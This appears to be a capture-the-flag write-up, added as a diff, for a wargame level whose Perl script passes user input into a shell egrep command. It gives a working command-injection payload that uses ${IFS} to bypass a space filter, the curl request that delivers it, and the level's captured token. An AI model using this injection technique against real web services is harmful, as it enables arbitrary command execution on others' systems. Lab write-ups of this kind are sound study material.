@@ -1,0 +1,42 @@
+level12
+
+flags/tokens:
+	token: g1qKMiRpXf53AWhDaU7FEkczr
+
+file: level12.pl
+
+quick code analysis:
+	shell execution at "@output = ... "
+
+	egrep "^$xx" /tmp/xd 2>&1
+	
+	$xx is under user control
+	
+	$xx is filtered:
+		$xx =~ tr/a-z/A-Z, lowercase is replaced with uppercase (no commands to execute)
+		$xx =~ tr/\s.*//, everything after the first space is ignored
+
+injection:
+	code:
+		"${IFS}-V${IFS};A="
+
+	after expansion:
+		egrep "^"${IFS}-V${IFS};A="" /tmp/xd 2>&1	
+		${IFS} is equivalent to space -> space filter bypass
+	
+	"${IFS}-V${IFS}; to disable grep listening
+	A=" to get rid of the last quote
+
+	this will execute /tmp/xd which is under attacker control
+
+/tmp/xd source:
+	getflag > /tmp/flagresult
+
+running the attack:
+
+	$ echo "getflag > /tmp/flagresult" > /tmp/xd
+	$ chmod 777 /tmp/xd
+	$ curl 127.0.0.1:4646/?x=%22%24%7BIFS%7D-V%24%7BIFS%7D%3BA%3D%22
+	$ cat /tmp/flagresult
+
+
